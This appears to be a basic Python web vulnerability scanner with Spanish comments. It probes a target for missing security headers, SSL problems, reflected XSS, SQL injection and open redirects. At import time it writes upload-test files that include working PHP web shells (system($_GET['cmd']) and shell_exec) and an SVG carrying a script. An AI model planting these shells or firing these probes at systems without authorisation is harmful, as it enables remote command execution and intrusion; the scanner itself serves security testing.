import requests
import os

def save_results_to_file(results, commands, filename="vulnerabilities_report.txt"):
    """Guarda los resultados del escaneo en un archivo."""
    with open(filename, "w") as f:
        f.write("Resultados de la Herramienta de Vulnerabilidades\n")
        f.write("=" * 50 + "\n")
        f.write(f"{'Vulnerabilidad':<25} {'Detalles':<25}\n")
        f.write("-" * 50 + "\n")
        for result in results:
            f.write(f"{result['name']:<25} {result['details']:<25}\n")
        f.write("\nComandos Utilizados:\n")
        f.write("=" * 50 + "\n")
        for command in commands:
            f.write(f"{command}\n")
    print(f"[INFO] Resultados guardados en {filename}")

def check_security_headers(target):
    """Verifica la presencia de encabezados de seguridad en el objetivo."""
    print(f"\n[INFO] Verificando encabezados de seguridad en: {target}")
    headers_to_check = [
        "Content-Security-Policy",
        "X-Frame-Options",
        "X-Content-Type-Options",
        "Strict-Transport-Security",
        "X-XSS-Protection",
        "Referrer-Policy",
        "Permissions-Policy",
        "Expect-CT",
        "Cross-Origin-Embedder-Policy"
    ]
    vulnerabilities = []

    try:
        response = requests.get(f"http://{target}", timeout=5)
        headers = response.headers
        for header in headers_to_check:
            if header not in headers:
                vulnerabilities.append({"name": "Falta encabezado", "details": header})
    except Exception as e:
        print(f"[ERROR] Error al verificar encabezados: {e}")
    return vulnerabilities

def generic_vulnerability_scan(target):
    """
    Realiza un escaneo genérico de vulnerabilidades en el objetivo.
    Verifica la presencia de encabezados de seguridad y realiza otras comprobaciones básicas.
    """
    print(f"[INFO] Iniciando escaneo de vulnerabilidades en {target}...")

    vulnerabilities = []
    
    # Verificación de encabezados de seguridad
    header_vulns = check_security_headers(target)
    vulnerabilities.extend(header_vulns)
    
    # Comprobación básica para detectar XSS
    xss_check_url = f"http://{target}/<script>alert('XSS')</script>"
    try:
        xss_response = requests.get(xss_check_url, timeout=5)
        if "<script>alert('XSS')</script>" in xss_response.text:
            vulnerabilities.append({"name": "Posible Vulnerabilidad XSS", "details": "El sitio refleja scripts no sanitizados."})
    except Exception as e:
        print(f"[ERROR] Error al verificar XSS: {e}")

    # Comprobación adicional para SQL Injection
    sql_injection_test_url = f"http://{target}/?id=1' OR '1'='1"
    
    try:
        response = requests.get(sql_injection_test_url, timeout=5)
        if 'error' in response.text.lower():  # Simplista; se puede mejorar según el contexto
            vulnerabilities.append({"name": "Posible Vulnerabilidad SQL Injection", "details": "Respuesta indica posible SQL Injection."})
        
    except Exception as e:
        print(f"[ERROR] Error al verificar SQL Injection: {e}")

    return vulnerabilities

def check_for_ssl(target):
    """Verifica si el objetivo tiene un certificado SSL válido."""
    try:
        response = requests.get(f"https://{target}", timeout=5)
        if response.status_code == 200:
            return [{"name": "SSL Válido", "details": f"El sitio usa HTTPS."}]
        else:
            return [{"name": "Problema con SSL", "details": f"El sitio no responde correctamente a HTTPS."}]
    except requests.exceptions.SSLError:
        return [{"name": "Error SSL", "details": "El certificado SSL es inválido."}]
    except Exception as e:
        print(f"[ERROR] Error al verificar SSL: {e}")
        return []

def scan_for_common_vulnerabilities(target):
    """Realiza un escaneo para vulnerabilidades comunes adicionales."""
    common_vulns = []
    
    # Ejemplo: Comprobación para Open Redirect
    open_redirect_test_url = f"http://{target}/redirect?url=http://malicious.com"
    
    try:
        response = requests.get(open_redirect_test_url, timeout=5)
        if response.url != open_redirect_test_url:  # Si redirige a otra URL
            common_vulns.append({"name": "Posible Vulnerabilidad Open Redirect", "details": "El sitio redirige a URLs externas."})
        
    except Exception as e:
        print(f"[ERROR] Error al verificar Open Redirect: {e}")

    return common_vulns

def prepare_malicious_files():
    """Crea archivos maliciosos necesarios para las pruebas."""
    malicious_files_content = {
        'malicious.jpg.php': '<?php echo shell_exec("ls"); ?>',
        'malicious.php': '<?php phpinfo(); ?>',
        'malicious.exe': b'\x4d\x5a\x90\x00',  # Header for a simple executable file
        'malicious.pdf': '%PDF-1.4\n%âãÏÓ\n1 0 obj\n<< /Title (Malicious PDF) >>\nendobj\n',
        'malicious.zip': b'PK\x03\x04',  # Header for a simple zip file
        'malicious.gif': b'GIF89a',  # Header for a simple GIF file
        'malicious.jsp': '<% out.println("Hello World"); %>',
        'malicious.svg': '<svg><script>alert(1)</script></svg>',
        'malicious.txt': 'This is a test file.',
        'malicious.php3': '<?php echo $_GET["cmd"]; ?>',
        'malicious.phtml': '<?php echo system($_GET["cmd"]); ?>',
        'malicious.py': '#!/usr/bin/env python3\nprint("Hello World")'
    }

    for filename, content in malicious_files_content.items():
        with open(filename, 'wb' if isinstance(content, bytes) else 'w') as f:
            f.write(content)

# Llamar a prepare_malicious_files() para crear los archivos maliciosos necesarios antes de ejecutar los escaneos.
prepare_malicious_files()
